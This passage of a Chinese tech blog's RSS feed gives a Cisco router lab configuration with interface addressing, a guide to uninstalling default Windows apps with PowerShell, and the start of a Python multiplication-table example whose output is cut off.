<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>配置控制台密码</h3>
<p>控制台密码用于本地设备访问的身份验证：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">line</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> console</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cisco</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">login</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>加密所有密码</h3>
<p>为提高安全性，加密所有已设置的密码：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">service</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> password-encryption</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>配置 VTY 密码</h3>
<p>VTY 密码用于远程访问的身份验证：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">line</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vty</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 15</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cisco</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>1.9 配置接口 IP 地址</h3>
<p>配置每个接口的 IP 地址以便于网络通信：</p>
<p>接口 g0/2：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> g0/2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.20.31.254</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.255.252</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接口 g0/0：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> g0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.20.16.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.254.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接口 g0/1：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> g0/1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.20.18.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 255.255.255.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>Branch-B IPv6 配置</h2>
<h3>进入特权模式</h3>
<p>与分支 A 相同，首先进入特权模式：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enable</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>进入全局配置模式</h3>
<p>进入全局配置模式后开始配置：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">configure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> terminal</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>设置主机名</h3>
<p>设置主机名为 Branch-B：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hostname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Branch-B</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>设置公告标语</h3>
<p>设置公告标语：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">banner</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> motd</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #Branch-B#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>配置特权 EXEC 密码</h3>
<p>设置特权 EXEC 密码以保护设备：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> secret</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> class</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>配置控制台密码</h3>
<p>配置控制台密码以保护本地访问：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">line</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> console</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cisco</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">login</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>加密所有密码</h3>
<p>加密所有密码以防止未授权访问：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">service</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> password-encryption</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>配置 VTY 密码</h3>
<p>配置 VTY 密码以保护远程访问：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">line</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vty</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 15</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cisco</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>配置接口 IPv6 地址</h3>
<p>配置每个接口的 IPv6 地址：</p>
<p>接口 g0/2：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> g0/2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2001:DB8:FFFF:FFFF::2/64</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FE80::B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-local</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接口 g0/0：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> g0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2001:DB8:FADE:00FF::1/64</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FE80::B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-local</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接口 g0/1：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> g0/1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2001:DB8:FADE:0100::1/64</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FE80::B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-local</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">no</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shutdown</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>使用Powershell卸载windows默认程序</title>
      <link>https://www.geekery.cn/note-book/Windows/%E4%BD%BF%E7%94%A8Powershell%E5%8D%B8%E8%BD%BDwindows%E9%BB%98%E8%AE%A4%E7%A8%8B%E5%BA%8F.html</link>
      <guid>https://www.geekery.cn/note-book/Windows/%E4%BD%BF%E7%94%A8Powershell%E5%8D%B8%E8%BD%BDwindows%E9%BB%98%E8%AE%A4%E7%A8%8B%E5%BA%8F.html</guid>
      <source url="https://www.geekery.cn/rss.xml">使用Powershell卸载windows默认程序</source>
      <description>使用Powershell卸载windows默认程序 管理员身份打开Powershell 输入 Win 键打开开始菜单，输入Powershell，然后选择管理员身份运行。 显示：左键单击Windows Powershell（管理员） 在这里插入图片描述 寻找你要卸载的程序 （这里以TranslatorforMicrosoftEdge为例） 你可能记不住程...</description>
      <pubDate>Sun, 28 Jul 2024 06:09:33 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>管理员身份打开Powershell</h2>
<p>输入 <kbd>Win</kbd> 键打开开始菜单，输入Powershell，然后选择管理员身份运行。</p>
<p>显示：左键单击Windows Powershell（管理员）</p>
<p></p>
<h2>寻找你要卸载的程序</h2>
<p>（这里以TranslatorforMicrosoftEdge为例）</p>
<p>你可能记不住程序的全名，使用*进行代替,进行模糊搜索，其实除了程序开发者外的其他人，或许没有人能够记住程序的全名了吧！！</p>
<p>使用get-appxpackage <em>edge</em>命令进行模糊搜索（你想要卸载什么程序就将edge换为什么程序）
PS：get-appxpackage [你要卸载的程序]</p>
<p>复制<code>PackageFullName</code>（包全名）备用在这个例子中即</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Microsoft.TranslatorforMicrosoftEdge_0.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">91.51</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.0_neutral_8wekyb3d8bbwe</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如图</p>
<p></p>
<h2>使用命令卸载程序</h2>
<p>1、remove-appxpackage [你要卸载的包全名]</p>
<p>2、打回车<kbd>Enter</kbd></p>
<p>3、程序自动卸载</p>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>Python实现九九乘法表</title>
      <link>https://www.geekery.cn/note-book/Research_Develop/Python/Python%E5%AE%9E%E7%8E%B0%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Research_Develop/Python/Python%E5%AE%9E%E7%8E%B0%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Python实现九九乘法表</source>
      <description>Python实现九九乘法表 以下是一个使用Python编写的简单代码用于生成九九乘法表。 Python 代码 输出示例 运行上述代码将生成如下的九九乘法表：</description>
      <pubDate>Sun, 28 Jul 2024 02:49:10 GMT</pubDate>
      <content:encoded><![CDATA[
<p>以下是一个使用Python编写的简单代码用于生成九九乘法表。</p>
<h2>Python 代码</h2>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">python</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> range</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    j </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    while</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> j </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&lt;=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> i:</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">j</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">*</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">i</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> j</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">end</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        j </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>输出示例</h2>
<p>运行上述代码将生成如下的九九乘法表：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1*1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1*2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    2</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">2=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1*3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    2</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">3=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    3</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">3=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">9</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1*4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    2</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">4=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    3</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">4=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">12</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   4</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">4=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">16</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1*5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    2</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">5=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   3</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">5=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">15</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   4</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">5=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">20</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   5</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">5=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">25</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1*6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    2</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">6=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">12</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   3</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">6=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">18</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   4</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">6=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   5</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">6=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">30</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   6</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">6=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">36</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1*7</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=7</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    2</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">7=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   3</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">7=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">21</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   4</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">7=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   5</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">7=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">35</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   6</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">7=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">42</span><span 